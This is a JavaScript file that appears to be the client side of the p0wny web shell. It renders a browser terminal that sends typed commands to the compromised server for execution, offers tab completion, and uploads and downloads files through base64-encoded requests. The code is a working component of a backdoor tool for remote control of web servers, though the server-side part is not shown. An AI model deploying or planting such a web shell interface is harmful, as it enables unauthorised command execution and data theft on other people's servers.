const script = [...document.scripts].find(script => script.src === import.meta.url);

const p0wnyConfig = {
    username: script?.dataset.username || 'p0wny',
    hostname: script?.dataset.hostname || 'shell',
    version: script?.getAttribute('version') || '0.0.0',
};

/**
 * P0wny class provides functionalities for creating an interactive shell environment.
 * It handles command execution, file upload and download, command completion, and updating the current working directory.
 */
export class P0wny {
    #config = null;
    cwd = null;
    #commandHistory = [];
    #historyPosition = 0;
    #eShellCmdInput = null;
    #eShellContent = null;

    constructor(config) {
        this.#config = config;
        this.cwd = null;
        this.#commandHistory = [];
        this.#historyPosition = 0;
        this.#eShellCmdInput = null;
        this.#eShellContent = null;
    }

    init() {
        this.#eShellCmdInput = document.getElementById('shell-cmd');
        this.#eShellContent = document.getElementById('shell-content');
        this.#eShellCmdInput.addEventListener('keydown', this.onShellInputKeyDown.bind(this));
        document.addEventListener('click', this.onDocumentClick.bind(this));
        this.updateCwd();
        this.#eShellCmdInput.focus();
    }

    // Keep command rendering and output rendering separate to preserve prompt formatting.
    _insertCommand(command) {
        this.#eShellContent.innerHTML += '\n\n';
        this.#eShellContent.innerHTML += '<span class=\"shell-prompt\">' + this.genPrompt(this.cwd) + '</span> ';
        this.#eShellContent.innerHTML += this.escapeHtml(command);
        this.#eShellContent.innerHTML += '\n';
        this.#eShellContent.scrollTop = this.#eShellContent.scrollHeight;
    }

    _insertStdout(stdout) {
        this.#eShellContent.innerHTML += this.escapeHtml(stdout);
        this.#eShellContent.scrollTop = this.#eShellContent.scrollHeight;
    }

    _defer(callback) {
        setTimeout(callback, 0);
    }

    /**
     * Executes a shell command.
     *
     * @param {string} command - The command to be executed in the shell.
     * @return {void}
     */
    featureShell(command) {
        this._insertCommand(command);
        if (/^\s*upload\s+\S+\s*$/.test(command)) {
            this.featureUpload(command.match(/^\s*upload\s+(\S+)\s*$/)[1]);
        } else if (/^\s*clear\s*$/.test(command)) {
            // The backend has no TERM setting, so clear the visible output locally.
            this.#eShellContent.innerHTML = '';
        } else {
            this.makeRequest('?feature=shell', {cmd: command, cwd: this.cwd}, (response) => {
                if (response.hasOwnProperty('file')) {
                    this.featureDownload(atob(response.name), response.file);
                } else {
                    this._insertStdout(atob(response.stdout));
                    this.updateCwd(atob(response.cwd));
                }
            });
        }
    }

    /**
     * Provides command or file completion based on the current input in the shell command input field.
     * Determines whether to complete a command or a file and makes a request to fetch suggestions.
     * If only one suggestion is available, it completes the input. For multiple suggestions,
     * inserts them into the standard output area.
     *
     * @function featureHint
     */
    featureHint() {
        if (this.#eShellCmdInput.value.trim().length === 0) return;

        const currentCmd = this.#eShellCmdInput.value.split(' ');
        const type = (currentCmd.length === 1) ? 'cmd' : 'file';

        const requestCallback = (data) => {
            if (data.files.length <= 1) return;
            data.files = data.files.map((file) => atob(file));
            if (data.files.length === 2) {
                if (type === 'cmd') {
                    this.#eShellCmdInput.value = data.files[0];
                } else {
                    const currentValue = this.#eShellCmdInput.value;
                    this.#eShellCmdInput.value = currentValue.replace(/(\S*)$/, data.files[0]);
                }
            } else {
                this._insertCommand(this.#eShellCmdInput.value);
                this._insertStdout(data.files.join('\n'));
            }
        };

    const fileName = (type === 'cmd') ? currentCmd[0] : currentCmd[currentCmd.length - 1];

        this.makeRequest('?feature=hint', {
            filename: fileName,
            cwd: this.cwd,
            type: type
        }, requestCallback);
    }

    /**
     * Triggers a download of a specified file.
     *
     * @param {string} name - The desired name for the downloaded file.
     * @param {string} file - The base64 encoded string representing the content of the file to be downloaded.
     * @return {void}
     */
    featureDownload(name, file) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
        element.setAttribute('download', name);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
        this._insertStdout('Done.');
    }

    /**
     * Initiates a file upload feature.
     *
     * @param {string} path - The destination path where the file should be uploaded.
     * @return {void}
     */
    featureUpload(path) {
        const element = document.createElement('input');
        element.setAttribute('type', 'file');
        element.style.display = 'none';
        document.body.appendChild(element);
        element.addEventListener('change', () => {
            const promise = this.getBase64(element.files[0]);
            promise.then((file) => {
                this.makeRequest('?feature=upload', {path: path, file: file, cwd: this.cwd}, (response) => {
                    this._insertStdout(atob(response.stdout));
                    this.updateCwd(atob(response.cwd));
                });
            }, () => {
                this._insertStdout('An unknown client-side error occurred.');
            });
        });
        element.click();
        document.body.removeChild(element);
    }

    /**
     * Converts a file to its base64 representation.
     *
     * @param {File} file - The file to be converted.
     * @return {Promise<string>} A promise that resolves with the base64 string of the file.
     */
    getBase64(file) {
    return new Promise(function (resolve, reject) {
        const reader = new FileReader();
        reader.onload = function () {
            resolve(reader.result.match(/base64,(.*)$/)[1]);
        };
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
    }

    /**
     * Generates a prompt string based on the current working directory.
     *
     * @param {string} cwd - The full path of the current working directory. Defaults to '~' if not provided.
     * @returns {string} A formatted prompt string containing the username, hostname, and a shortened version of the current working directory.
     */
    genPrompt(cwd) {
        cwd = cwd || '~';
        let shortCwd = cwd;
        if (cwd.split('/').length > 3) {
            const splitCwd = cwd.split('/');
            shortCwd = '…/' + splitCwd[splitCwd.length - 2] + '/' + splitCwd[splitCwd.length - 1];
        }
        return this.#config.username + '@' + this.#config.hostname + ':<span title="' + cwd + '">' + shortCwd + '</span>#';
    }

    /**
     * Updates the current working directory.
     *
     * @param {string|null} cwd - The new current working directory. If null, fetches it from the server.
     * @return {void}
     */
    updateCwd(cwd = null) {
        if (cwd) {
            this.cwd = cwd;
            this._updatePrompt();
            return;
        }
        this.makeRequest('?feature=pwd', {}, (response) => {
            this.cwd = atob(response.cwd);
            this._updatePrompt();
        });
    }

    /**
     * Escapes HTML special characters in a given string.
     *
     * @param {string} string - The input string containing HTML special characters.
     * @return {string} A new string with HTML special characters escaped.
     */
    escapeHtml(string) {
        return string
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    /**
     * Updates the content of the shell prompt element with a new prompt string generated by the `genPrompt` function using the current working directory (CWD).
     *
     * @return {void}
     */
    _updatePrompt() {
        const eShellPrompt = document.getElementById('shell-prompt');
        eShellPrompt.innerHTML = this.genPrompt(this.cwd);
    }

    /**
     * Inserts a command into the command history and updates the history position.
     *
     * @param {string} cmd - The command to be inserted into the history.
     * @return {void}
     */
    insertToHistory(cmd) {
        this.#commandHistory.push(cmd);
        this.#historyPosition = this.#commandHistory.length;
    }

    /**
     * Handles key down events for the shell input.
     *
     * @param {KeyboardEvent} event - The keyboard event object containing information about the key pressed.
     */
    onShellInputKeyDown(event) {
        switch (event.key) {
            case 'Enter':
                this.featureShell(this.#eShellCmdInput.value);
                this.insertToHistory(this.#eShellCmdInput.value);
                this.#eShellCmdInput.value = '';
                break;
            case 'ArrowUp':
                if (this.#historyPosition > 0) {
                    this.#historyPosition--;
                    this.#eShellCmdInput.blur();
                    this.#eShellCmdInput.value = this.#commandHistory[this.#historyPosition];
                    this._defer(() => {
                        this.#eShellCmdInput.focus();
                    });
                }
                break;
            case 'ArrowDown':
                if (this.#historyPosition >= this.#commandHistory.length) {
                    break;
                }
                this.#historyPosition++;
                if (this.#historyPosition === this.#commandHistory.length) {
                    this.#eShellCmdInput.value = '';
                } else {
                    this.#eShellCmdInput.blur();
                    this.#eShellCmdInput.focus();
                    this.#eShellCmdInput.value = this.#commandHistory[this.#historyPosition];
                }
                break;
            case 'Tab':
                event.preventDefault();
                this.featureHint();
                break;
        }
    }

    /**
     * Sends a POST request to the specified URL with given parameters and processes the response using the provided callback function.
     *
     * @param {string} url - The URL to which the request will be sent.
     * @param {Object} params - An object containing key-value pairs of parameters to be sent in the request body.
     * @param {function} callback - A function that takes the parsed JSON response as an argument and processes it.
     * @return {void}
     */
    makeRequest(url, params, callback) {
    function getQueryString() {
        const a = [];
        for (const key in params) {
            if (params.hasOwnProperty(key)) {
                a.push(encodeURIComponent(key) + '=' + encodeURIComponent(params[key]));
            }
        }
        return a.join('&');
    }

    const xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            try {
                const responseJson = JSON.parse(xhr.responseText);
                callback(responseJson);
            } catch (error) {
                alert('Error while parsing response: ' + error);
            }
        }
    };
    xhr.send(getQueryString());
    }

    onDocumentClick(event) {
        const selection = window.getSelection();
        const target = event.target;

        if (target.tagName === 'SELECT') {
            return;
        }

        if (!selection.toString()) {
            this.#eShellCmdInput.focus();
        }
    }
}

const p0wny = new P0wny(p0wnyConfig);
window.addEventListener('load', () => p0wny.init());
